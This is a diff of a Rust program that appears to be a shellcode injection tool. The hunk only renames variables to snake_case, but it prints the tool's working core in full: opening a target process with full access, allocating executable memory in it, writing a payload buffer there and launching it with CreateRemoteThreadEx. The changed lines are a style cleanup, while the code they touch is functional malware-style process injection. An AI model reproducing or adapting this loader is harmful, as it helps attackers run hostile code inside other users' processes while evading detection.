@@ -64,26 +64,26 @@ fn main() {
         }
 
         match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
-            Ok(hProcess) => {
+            Ok(h_process) => {
                 let r_buf = VirtualAllocEx(
-                    hProcess,
+                    h_process,
                     Some(null_mut()),
                     buf.len(),
                     MEM_RESERVE | MEM_COMMIT,
                     PAGE_EXECUTE_READWRITE,
                 );
 
-                if let Err(_) = WriteProcessMemory(hProcess, r_buf, buf.as_ptr() as _, buf.len(), None)
+                if let Err(_) = WriteProcessMemory(h_process, r_buf, buf.as_ptr() as _, buf.len(), None)
                 {
                     println!("[-] Error when performing WriteProcessMemory");
-                    CloseHandle(hProcess);
+                    CloseHandle(h_process);
                     std::process::exit(0)
                 }
 
                 println!("[+] CreateRemoteThread Executed!");
                 let tid = 0;
-                let hThread = CreateRemoteThreadEx(
-                    hProcess,
+                let h_thread = CreateRemoteThreadEx(
+                    h_process,
                     None,
                     0,
                     Some(std::mem::transmute(r_buf)),
@@ -92,8 +92,9 @@ fn main() {
                     None,
                     Some(tid as _)
                 ).unwrap();
-                CloseHandle(hProcess);
-                CloseHandle(hThread);
+                
+                CloseHandle(h_process);
+                CloseHandle(h_thread);
             }
             Err(erro) => {
                 println!("[-] Error when performing OpenProcess");
